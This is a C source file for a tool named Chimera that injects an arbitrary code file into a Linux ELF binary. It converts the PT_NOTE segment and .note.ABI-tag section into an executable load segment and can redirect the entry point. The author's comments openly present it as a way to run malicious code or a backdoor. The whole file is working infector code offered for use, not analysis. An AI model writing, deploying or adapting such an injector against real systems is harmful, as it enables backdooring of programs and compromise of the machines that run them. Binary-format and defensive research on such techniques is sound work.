/* AUTHOR: John Ebinyi Odey a.k.a Redhound, Giannis, Hotwrist
 * CHIMERA BIRTH: February 2025
 * DESCRIPTION: Chimera is a program that injects itself into a Linux ELF 
 * 		program by overwriting the PT_NOTE section of the target ELF 
 *		file thereby enabling the hacker run malicious code. 
 *		This malicious code could be a backdoor! 
 *
 *		HAPPY HACKING! ^_^
*/

#include <err.h>
#include <stdio.h>
#include <gelf.h>
#include <libelf.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <stdbool.h>
#include <sysexits.h>

//--------------------------------------------
#define REQUIRED_CMDLINE_ARGS 6

#define SUCCESS 0
#define INCOMPLETE_CMDLINE_ARGS_ERR 1
#define FILE_PTR_ERR 2
#define NOT_LINUX_ELF_OBJ_CLASS_ERR 3
#define MALLOC_ERR 4
#define FREAD_ERR 5
#define FWRITE_ERR 6
#define LSEEK_FTELL_ERR 7
#define MALCODE_APPEND_TO_FILE_ERR 8
#define MODIFY_ELF_SECTIONS_ERR 9
#define MODIFY_ELF_SEGMENT_ERR 10
#define GELF_UPDATE_ERR 11
#define GELF_GETSHDR_ERR 12
#define GET_SECTION_NAME_ERR 13
#define ENTRY_POINT_REWRITE_ERR 14
#define REORDER_SEC_HDR_ERR 15
#define UPDATE_ELF_SHDR_ERR 16
#define MODIFY_SECNAME_ERR 17
#define SECNAME_GTT_ABITAG_NAME_ERR 18
#define PT_NOTE_HDR_NOT_FOUND_ERR 19
#define GET_PROGRAM_HDR_ERR 20
//--------------------------------------------

#define GREEN "\033[1;32m"
#define RED "\033[1;31m"
#define RESET "\033[0m"

#define RIGHT_DIRECTION 1
#define LEFT_DIRECTION -1

//--------------------------------------------
#define ABITAG_NAME   ".note.ABI-tag"
#define SHSTRTAB_NAME ".shstrtab"
//--------------------------------------------

typedef struct elf_data
{
	bool is_elf;
	int fd;         /* file descriptor */
	int bits;       /* 32-bit or 64-bit */
  	Elf *e;         /* elf descriptor */
  	GElf_Ehdr ehdr; /* ELF executable header */
} elf_data_t;

typedef struct chimera_data 
{
	char *code;     /* chimera code to inject */
  	off_t sh_stroff; /* offset to section name to overwrite */
  	size_t len;     /* number of code bytes */
  	long entry;     /* code buffer offset to entry point (-1 for none) */
  	off_t off;      /* file offset to injected code */
  	size_t section_addr; /* section address for injected code */
  	char *section_name;  /* section name for injected code */
	size_t pidx;    /* index of program header to overwrite */
  	GElf_Phdr phdr; /* program header to overwrite */
  	size_t sidx;    /* index of section header to overwrite */
  	Elf_Scn *scn;   /* section to overwrite */
  	GElf_Shdr shdr; /* section header to overwrite */
} chimera_data_t;

elf_data_t *elf;
chimera_data_t *chimera;
//--------------------------------------------------------------------------------

int modify_elf_ehdr()
{
 	off_t off;
 	size_t n, ehdr_size;
  	void *ehdr_buf;

  	if(!gelf_update_ehdr(elf->e, &elf->ehdr)) 
  	{
    		fprintf(stderr, "Failed to update executable header\n");
    		return GELF_UPDATE_ERR;
  	}

  	if(elf->bits == 32) 
  	{
    		ehdr_buf = elf32_getehdr(elf->e);
    		ehdr_size = sizeof(Elf32_Ehdr);
  	} 
  	else 
  	{
    		ehdr_buf = elf64_getehdr(elf->e);
    		ehdr_size = sizeof(Elf64_Ehdr);
  	}

  	if(!ehdr_buf) 
  	{
    		fprintf(stderr, "Failed to get executable header\n");
    		return -1;
  	}

  	off = lseek(elf->fd, 0, SEEK_SET);
  	if(off < 0) 
  	{
    		fprintf(stderr, "lseek failed\n");
    		return LSEEK_FTELL_ERR;
  	}

  	n = write(elf->fd, ehdr_buf, ehdr_size);
  	if(n != ehdr_size) 
  	{
    		fprintf(stderr, "Failed to write executable header\n");
    		return FWRITE_ERR;
  	}

  	return SUCCESS;
}

int rewrite_entry_point()
{
  	elf->ehdr.e_entry = chimera->phdr.p_vaddr + chimera->entry;
  	return modify_elf_ehdr();
}

int update_elf_phdr()
{
	off_t off;
  	size_t n, phdr_size;
  	Elf32_Phdr *phdr_list32;
  	Elf64_Phdr *phdr_list64;
  	void *phdr_buf;
  
	if(!gelf_update_phdr(elf->e, chimera->pidx, &chimera->phdr)) 
	{
    		fprintf(stderr, "Failed to update program header\n");
    		return GELF_UPDATE_ERR;
    	}
    	
    	phdr_buf = NULL;
  	
  	if(elf->bits == 32) 
  	{
    		phdr_list32 = elf32_getphdr(elf->e);
    		
    		if(phdr_list32) 
    		{
      			phdr_buf = &phdr_list32[chimera->pidx];
      			phdr_size = sizeof(Elf32_Phdr);
    		}
  	} 
  	else 
  	{
    		phdr_list64 = elf64_getphdr(elf->e);
    		if(phdr_list64) 
    		{
      			phdr_buf = &phdr_list64[chimera->pidx];
      			phdr_size = sizeof(Elf64_Phdr);
    		}
  	}
  	
  	if(!phdr_buf) 
  	{
    		fprintf(stderr, "Failed to get program header\n");
    		return GET_PROGRAM_HDR_ERR;
  	}
  	 
  	off = lseek(elf->fd, elf->ehdr.e_phoff + chimera->pidx*elf->ehdr.e_phentsize, SEEK_SET);
  
  	if(off < 0) 
  	{
    		fprintf(stderr, "lseek failed\n");
    		return LSEEK_FTELL_ERR;
  	}

  	n = write(elf->fd, phdr_buf, phdr_size);
  
  	if(n != phdr_size) 
  	{
    		fprintf(stderr, "Failed to write program header\n");
    		return FWRITE_ERR;
  	}

  	return SUCCESS;	
}

int modify_elf_segment()
{
	GElf_Phdr phdr;
	size_t n;
	bool found_pt_note_hdr = false;
	
	if(elf_getphdrnum(elf->e, &n) != 0) errx(EX_DATAERR, RED "elf_getphdrnum() failed: %s." RESET, elf_errmsg(-1));
	
	for(size_t i = 0; i < n; ++i)
	{
		if(gelf_getphdr(elf->e, i, &phdr) != &phdr) errx(EX_SOFTWARE, RED "getphdr() failed: %s." RESET, elf_errmsg(-1));
		
		switch(phdr.p_type)
		{
			case PT_NOTE: 
				found_pt_note_hdr = true; 
				chimera->pidx = i; 
				break;
			default: 
				break;
		}
		
		if(found_pt_note_hdr == true) break;
	}
	
	if(!found_pt_note_hdr) return PT_NOTE_HDR_NOT_FOUND_ERR;
	
	memcpy(&chimera->phdr, &phdr, sizeof(phdr));
	
	chimera->phdr.p_type   = PT_LOAD;         /* type */
	chimera->phdr.p_offset = chimera->off;     /* file offset to start of segment */
	chimera->phdr.p_vaddr  = chimera->section_addr; /* virtual address to load segment at */
	chimera->phdr.p_paddr  = chimera->section_addr; /* physical address to load segment at */
	chimera->phdr.p_filesz = chimera->len;     /* byte size in file */
	chimera->phdr.p_memsz  = chimera->len;     /* byte size in memory */
	chimera->phdr.p_flags  = PF_R | PF_X;     /* flags */
	chimera->phdr.p_align  = 0x1000;          /* alignment in memory and file */
	
	return update_elf_phdr();
}

int modify_section_name()
{
	// we don't want the 'length of the original section name' we want to overwrite to
	// be more than that of the injected section name. The injected section name has to be smaller.
	// WHY? to maintain orderliness.
	if(strlen(chimera->section_name) > strlen(ABITAG_NAME))
	{
		return SECNAME_GTT_ABITAG_NAME_ERR;
	}
	
	Elf_Scn *scn;
	GElf_Shdr shdr;
	size_t abi_tag_name_offset, strtab_start_addr, shstrndx;
	char *section_name;
	bool found_section_name = false;
	
	if (elf_getshdrstrndx(elf->e, &shstrndx) != 0) errx(EX_SOFTWARE, "elf_getshdrstrndx() failed: %s.", elf_errmsg(-1));

	scn = NULL;
	
	while((scn = elf_nextscn(elf->e, scn)) != NULL)
	{
		if(gelf_getshdr(scn, &shdr) != &shdr) errx(EX_SOFTWARE, "getshdr() failed: %s.", elf_errmsg(-1));
		
		if((section_name = elf_strptr(elf->e, shstrndx, shdr.sh_name)) == NULL) errx(EX_SOFTWARE, "elf_strptr() failed: %s.", elf_errmsg(-1));
		
		if(strcmp(section_name, SHSTRTAB_NAME) == 0) strtab_start_addr = shdr.sh_offset;
		
		else
		{
			if(strcmp(section_name, ABITAG_NAME) == 0) abi_tag_name_offset = shdr.sh_name;
		}
	}
	
	// sh_stroff will be used to store the offset of ABITAG_NAME in the section header string table.
	chimera->sh_stroff = strtab_start_addr + abi_tag_name_offset;
	
	// Now, let us write the section name for the injected code.
	size_t len = lseek(elf->fd, chimera->sh_stroff, SEEK_SET);
	
	if(len < 0) return LSEEK_FTELL_ERR;
	
	if((write(elf->fd, chimera->section_name, strlen(chimera->section_name))) != strlen(chimera->section_name))
	{
		return FWRITE_ERR;
	}
	
	size_t diff = strlen(ABITAG_NAME) - strlen(chimera->section_name);
	
	while(diff > 0)
	{
		if((write(elf->fd, "\0", 1)) != 1) return FWRITE_ERR;
		diff--;
	}
	
	return SUCCESS;
}

int update_elf_shdr(Elf_Scn *scn, GElf_Shdr *shdr, size_t sidx)
{
	if(!gelf_update_shdr(scn, shdr)) return GELF_UPDATE_ERR;
	
	void *shdr_buf;
	size_t shdr_size;
	
	if(elf->bits == 32)
	{
		shdr_buf = elf32_getshdr(scn);
		shdr_size = sizeof(Elf32_Shdr);
	}
	else
	{
		shdr_buf = elf64_getshdr(scn);
		shdr_size = sizeof(Elf64_Shdr);
	}
	
	if(!shdr_buf)
	{
		fprintf(stderr, RED "Error: Failed to get %d section header.\n" RESET, elf->bits);
		return GELF_GETSHDR_ERR;
	}
	
	if(lseek(elf->fd, ((elf->ehdr.e_shoff) + (sidx * elf->ehdr.e_shentsize)), SEEK_SET) < 0) return LSEEK_FTELL_ERR;
	
	if(write(elf->fd, shdr_buf, shdr_size) != shdr_size) return FWRITE_ERR;
	
	return SUCCESS;
}

// This function helps to reorder the section headers, especially our injected section.
// First, we check if the injected section is in the proper location (the addresses should
// be in increasing order). If the address of the section before the injected section is 
// higher than that of the injected section, reorder the injected section by moving it left.
// If the address after the injected section is less than that of the injected section, move the
// injected section right. This will help to position the injected section in the proper address
// location in increasing order e.g 1, 2, 3, 4, .....
int reorder_section_headers()
{
	Elf_Scn *scn;
	GElf_Shdr shdr;
	int direction = 0, skip_not_progbits = 0;
	size_t i;
	
	if((scn = elf_getscn(elf->e, chimera->sidx - 1)) == NULL) errx(EX_SOFTWARE, "getscn() failed: %s.", elf_errmsg(-1));
	
	if(scn && !gelf_getshdr(scn, &shdr)) errx(EX_SOFTWARE, "getshdr() failed: %s.", elf_errmsg(-1));
	
	if(scn && shdr.sh_addr > chimera->shdr.sh_addr) direction = LEFT_DIRECTION;
	
	if((scn = elf_getscn(elf->e, chimera->sidx + 1)) == NULL) errx(EX_SOFTWARE, "getscn() failed: %s.", elf_errmsg(-1));
	
	if(scn && !gelf_getshdr(scn, &shdr)) errx(EX_SOFTWARE, "getshdr() failed: %s.", elf_errmsg(-1));
	
	if(scn && shdr.sh_addr < chimera->shdr.sh_addr) direction = RIGHT_DIRECTION;
	
	if(direction == 0) return SUCCESS;
	
	i = chimera->sidx;
	
	for(scn = elf_getscn(elf->e, chimera->sidx + direction); scn != NULL; scn = elf_getscn(elf->e, chimera->sidx + direction + skip_not_progbits))
	{
		if(!gelf_getshdr(scn, &shdr)) errx(EX_SOFTWARE, "getshdr() failed: %s.", elf_errmsg(-1));

		if(direction == RIGHT_DIRECTION)
		{
			if(shdr.sh_addr >= chimera->shdr.sh_addr) break;
		}
		else
		{
			if(direction == LEFT_DIRECTION)
			{
				if(shdr.sh_addr <= chimera->shdr.sh_addr) break;
			}
		}
		
		if(shdr.sh_type != SHT_PROGBITS) 
		{
			skip_not_progbits += direction;
			continue;
    		}
    		
		if(update_elf_shdr(scn, &chimera->shdr, elf_ndxscn(scn)) < SUCCESS)
		{
			return MODIFY_ELF_SECTIONS_ERR;
		}
		
		if(update_elf_shdr(chimera->scn, &shdr, chimera->sidx) < SUCCESS)
		{
			return MODIFY_ELF_SECTIONS_ERR;
		}
		
    		chimera->sidx += direction + skip_not_progbits;
    		chimera->scn = elf_getscn(elf->e, chimera->sidx);
    		skip_not_progbits = 0;
	}
	
	return SUCCESS;
}

int modify_elf_sections()
{
	Elf_Scn *scn;
	GElf_Shdr shdr;
	size_t shstrndx;
	char *section_name;
	bool found_section_name = false;
	
	if (elf_getshdrstrndx(elf->e, &shstrndx) != 0) errx(EX_SOFTWARE, "elf_getshdrstrndx() failed: %s.", elf_errmsg(-1));

	scn = NULL;
	
	while((scn = elf_nextscn(elf->e, scn)) != NULL)
	{
		if(gelf_getshdr(scn, &shdr) != &shdr) errx(EX_SOFTWARE, "getshdr() failed: %s.", elf_errmsg(-1));
		
		if((section_name = elf_strptr(elf->e, shstrndx, shdr.sh_name)) == NULL) errx(EX_SOFTWARE, "elf_strptr()␣failed: %s.", elf_errmsg(-1));
		
		if(strcmp(section_name, ABITAG_NAME) == 0)
		{
			shdr.sh_name = shdr.sh_name;
			shdr.sh_type = SHT_PROGBITS;
			shdr.sh_flags = SHF_ALLOC | SHF_EXECINSTR;
			shdr.sh_addr = chimera->section_addr;
			shdr.sh_offset = chimera->off;
			shdr.sh_size = chimera->len;
			shdr.sh_link = 0;
			shdr.sh_info = 0;
			shdr.sh_addralign = 16;
			shdr.sh_entsize = 0;
			
			found_section_name = true;
			break;
		}
	}
	
	if(found_section_name == true)
	{
		chimera->sidx = elf_ndxscn(scn);
		chimera->scn = scn;
		memcpy(&chimera->shdr, &shdr, sizeof(shdr));
		if(update_elf_shdr(scn, &shdr, elf_ndxscn(scn)) != SUCCESS) return UPDATE_ELF_SHDR_ERR;
		if(reorder_section_headers() != SUCCESS) return REORDER_SEC_HDR_ERR;
		if(modify_section_name() != SUCCESS) return MODIFY_SECNAME_ERR;
	}
	else return GET_SECTION_NAME_ERR;

	return SUCCESS;
}

void align_section_addr()
{
	size_t diff = (chimera->off % sysconf(_SC_PAGESIZE)) - (chimera->section_addr % sysconf(_SC_PAGESIZE));
	chimera->section_addr += diff;
}

// This function writes our malicious code to the end of the target Linux ELF file.
int append_malcode_to_elf()
{
	// move to the end of the file
	off_t elf_len = lseek(elf->fd, 0, SEEK_END);
	
	if(elf_len < 0) return LSEEK_FTELL_ERR;
	
	size_t len_read = write(elf->fd, chimera->code, chimera->len);
	
	if(len_read != chimera->len)
	{
		fprintf(stderr, "Error: Failed to write the malicious code content to the end of elf file.\n");
		return FWRITE_ERR;
	}
	
	chimera->off = elf_len;
	
	// take it back to the begining of the file
	lseek(elf->fd, 0, SEEK_SET);
	
	return SUCCESS;
}

// Alright, let's start the chimera code injection...hohohohohoho!
int start_code_injection(char *code_to_inject, char *section_name, size_t section_addr, long entry_addr)
{
	FILE *file_ptr;
	size_t code_to_inject_len;
	
	if((file_ptr = fopen(code_to_inject, "r")) == NULL)
	{
		fprintf(stderr, RED "Error: Can not open %s file.\n" RESET, code_to_inject);
		return FILE_PTR_ERR;
	}

	fseek(file_ptr, 0, SEEK_END);
	code_to_inject_len = ftell(file_ptr);
	fseek(file_ptr, 0, SEEK_SET);

	char *code_to_inject_buf = (char*)malloc(code_to_inject_len);
	
	// check for malloc failure.
	if(!code_to_inject_buf)
	{
		fprintf(stderr, RED "Error: Failed to allocate buffer!\n" RESET);
		fclose(file_ptr);
		return MALLOC_ERR;
	}
	
	if(fread(code_to_inject_buf, 1, code_to_inject_len, file_ptr) != code_to_inject_len)
	{
		fprintf(stderr, RED "Error: Failed to read the malicious code content for %s.\n" RESET, code_to_inject);
		fclose(file_ptr);
		return FREAD_ERR;
		
	}

	chimera->code = code_to_inject_buf;
	chimera->len = code_to_inject_len;
	chimera->entry = entry_addr;
	chimera->section_addr = section_addr;
	chimera->section_name = strdup(section_name);
	
	if(append_malcode_to_elf() != SUCCESS)
	{
		fclose(file_ptr);
		return MALCODE_APPEND_TO_FILE_ERR;
	}
	
	align_section_addr();
	
	if(modify_elf_sections() != SUCCESS)
	{
		fclose(file_ptr);
		return MODIFY_ELF_SECTIONS_ERR;
	}
	
	if(modify_elf_segment() != SUCCESS)
	{
		fclose(file_ptr);
		return MODIFY_ELF_SEGMENT_ERR;
	}
	
	// We don't want to overwrite or modify the entry address manually. Hence,
	// we supply an entry point value of 0 or more.
  	if((chimera->entry >= 0) && (rewrite_entry_point() != SUCCESS)) {
    		return ENTRY_POINT_REWRITE_ERR;
  	}
	
	fclose(file_ptr);
	
	return SUCCESS;
}

int main(int argc, char **argv)
{
	if(argc != REQUIRED_CMDLINE_ARGS)
	{
		fprintf(stderr, RED "\t%s: Usage: %s <elf_file> <file_to_inject> <section_name> <addr> <entry>\n\n" RESET, __FUNCTION__, argv[0]);
		printf(GREEN "\t[+] Inject <file_to_inject> into <elf_file> using the given <section_name>\n" RESET);
		printf(GREEN "\t[+] and base (virtual) address. The <entry> is optional and can be left as\n" RESET);
		printf(GREEN "\t[+] -1 if you don\'t need an entry point to be set in <elf_file>.\n" RESET);
		
		return INCOMPLETE_CMDLINE_ARGS_ERR;
	}
	
	// allocate memory to both structs
	elf = (elf_data_t*)malloc(sizeof(elf_data_t));
	if (!elf) 
	{
    		fprintf(stderr, RED "Error: Failed to allocate elf_data_t!\n" RESET);
    		return MALLOC_ERR;
	}

	chimera = (chimera_data_t*)malloc(sizeof(chimera_data_t));
	if (!chimera) 
	{
    		fprintf(stderr, RED "Error: Failed to allocate chimera_data_t!\n" RESET);
    		free(elf);  // Free previously allocated memory
    		return MALLOC_ERR;
	}
	
	Elf *elf_fd = NULL;
	Elf_Kind e_kind;
	int file_ptr = 0;
	char *elf_k = NULL;
	bool is_elf = false;
	int bits = 0;
	
	// Check the current version of the elf. We need the version to work properly.
	if(elf_version(EV_CURRENT) == EV_NONE) errx(EX_SOFTWARE, RED "ELF library initialization failed: %s" RESET, elf_errmsg(-1));
	
	file_ptr = open(argv[1], O_RDWR, 0);

	if(file_ptr < 0)
	{
		fprintf(stderr, RED "Can not open ELF file: %s\n" RESET, argv[1]);
		exit(EXIT_FAILURE);
	}
	
	if((elf_fd = elf_begin(file_ptr, ELF_C_READ, 0)) == NULL) errx(EX_SOFTWARE, RED "elf_begin() failed: %s." RESET, elf_errmsg(-1));
	
	switch(gelf_getclass(elf_fd))
	{
		case ELFCLASSNONE: bits = -1; break;
		case ELFCLASS32: bits = 32; break;
		case ELFCLASS64: bits = 64; break;
		default: bits = 0;
	}
	
	e_kind = elf_kind(elf_fd);
	
	switch(e_kind)
	{
		case ELF_K_AR: elf_k = "Linux Archive File"; break;
		case ELF_K_ELF: is_elf = true; break;
		case ELF_K_NONE: elf_k = "Data"; break;
		default: elf_k = "Unknown/Unrecognized!";
	}
	
	if(is_elf == false || bits == -1 || bits == 0)
	{
		printf(RED "Error: %s is not a Linux Elf Object, rather a %s. Also, the Elf class is unknown.\n" RESET, argv[1], elf_k);
		return NOT_LINUX_ELF_OBJ_CLASS_ERR;
	}
	
	elf->fd = file_ptr;
	elf->e = elf_fd; 
	elf->is_elf = is_elf;
	elf->bits = bits;
	
	if(!gelf_getehdr(elf->e, &elf->ehdr)) errx(EX_SOFTWARE, "getehdr() failed: %s.", elf_errmsg(-1));
	
	if((start_code_injection(argv[2], argv[3], strtoul(argv[4], NULL, 0), strtol(argv[5], NULL, 0))) != SUCCESS)
		fprintf(stderr, RED "Error: Code injection failed woefully!" RESET);

	// clean up routines
	elf_end(elf_fd);
	close(file_ptr);
	
	free(elf);
	free(chimera);
	free(chimera->code);
	free(chimera->section_name);
	
	printf("DONE!");
	
	return SUCCESS;
	
}
